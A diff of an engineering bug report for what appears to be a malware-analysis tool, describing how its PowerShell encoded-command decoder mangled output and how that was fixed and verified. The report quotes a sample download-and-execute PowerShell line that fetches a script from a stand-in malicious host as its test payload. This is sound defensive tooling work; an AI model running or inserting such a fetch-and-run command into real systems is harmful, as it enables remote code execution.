@@ -70,20 +70,21 @@ Every row records: backend field populated, frontend component consuming it, liv
 
 These are backend data-quality bugs, **not integration gaps**. Frontend faithfully renders what the backend returns.
 
-### BUG-01 · UTF-16 endianness in `ps-encodedcommand-recovery`
+### BUG-01 · Hard-coded UTF-16LE in `powershell-encoded` operation · **FIXED**
 
-**Symptom:** Every decode layer's `preview` field shows CJK ideographs like `䕉⁘丨睥伭橢捥⁴敎⹴敗䍢楬湥⥴䐮睯汮慯卤牴湩⡧栢瑴獰⼺洯污捩潩獵挮浯瀯瀮ㅳ⤢` instead of the readable `IEX (New-Object Net.WebClient).DownloadString("https://malicious.com/p.ps1")`.
+**Symptom (before fix):** Every decode layer's `preview` field showed CJK ideographs like `䕉⁘丨睥伭橢捥⁴敎⹴敗䍢楬湥⥴䐮睯汮慯卤牴湩⡧栢瑴獰⼺洯污捩潩獵挮浯瀯瀮ㅳ⤢` instead of the readable `IEX (New-Object Net.WebClient).DownloadString("https://malicious.com/p.ps1")`.
 
-**Root cause:** PowerShell `-enc` uses **UTF-16LE**; the decoder is interpreting bytes as **UTF-16BE**, so every byte pair is swapped and lands in CJK Unified Ideographs (U+4000–U+9FFF). Confirmed by inspecting `cio.decode_chain[0].preview` directly.
+**Root cause (actual):** Not an endianness bug. The `powershell-encoded` op in `/app/backend/operations.py:599` was hard-coded to `raw.decode("utf-16-le", errors="ignore")` with no fallback. Real PowerShell `-EncodedCommand` payloads *are* UTF-16LE, but variant/test payloads (and the audit payload here) base64-encode ASCII bytes directly. Decoding ASCII bytes as UTF-16LE produces one CJK codepoint per pair of ASCII characters (byte pair 0x49 0x45 → U+4549 = `䕉`).
 
-**Impact:**
-- Output lens shows garbage across all 6 decode layers
-- Story/Executive narrative embeds the same garbage inside `` `Recovered payload reads: ...` ``
-- **Does NOT affect:** IOC extraction (the extractor works on raw base64 or the correctly decoded utf-16 elsewhere), MITRE mapping, LOLBAS, OSINT, verdict, tiered evidence — those all fired correctly (`malicious.com`, `https://malicious.com/p.ps1` were extracted; T1059.001/T1027.010/T1566.001 mapped)
+**Fix applied:** Replaced with `_ps_encoded_smart_decode_bytes()` — tries strict UTF-16LE first (canonical -EncodedCommand), falls back to strict UTF-8, then UTF-16LE-replace as final safety net. Uses `_mostly_printable()` (≥85% ratio) to gate each candidate. Order preserved so genuine UTF-16LE always wins the tie.
 
-**File to fix:** `backend/decoders/…/ps-encodedcommand-recovery.py` (or equivalent) — change `.decode("utf-16-be")` to `.decode("utf-16-le")` (or set the correct BOM handling).
-
-**Priority:** P0 for user-facing quality — the whole point of the "Recovered payload reads" line is analyst readability.
+**Verification (after fix):**
+- Live `/api/decode/smart` with the same payload now returns `cio.decode_chain[0].preview = "IEX (New-Object Net.WebClient).DownloadString(\"https://malicious.com/p.ps1\")"`
+- Story lens shows the readable recovered payload verbatim
+- Verdict jumped from 99% → **100% CRITICAL** (better evidence signal on the readable text)
+- Behavior count: 2 → 3 · Evidence graph links: 27 → 31 (ioc extraction now runs on readable text)
+- Unit test: `run_operation("ps-encodedcommand-recovery", <ascii-b64>)` → clean text; `<utf16le-b64>` → clean text; random binary → UTF-16LE-replace (no crash)
+- Parity suite: 18 / 18 tests pass
 
 ### BUG-02 · Quality-gate corpus reports 0.0 for threat_intel / mitre / understanding
 
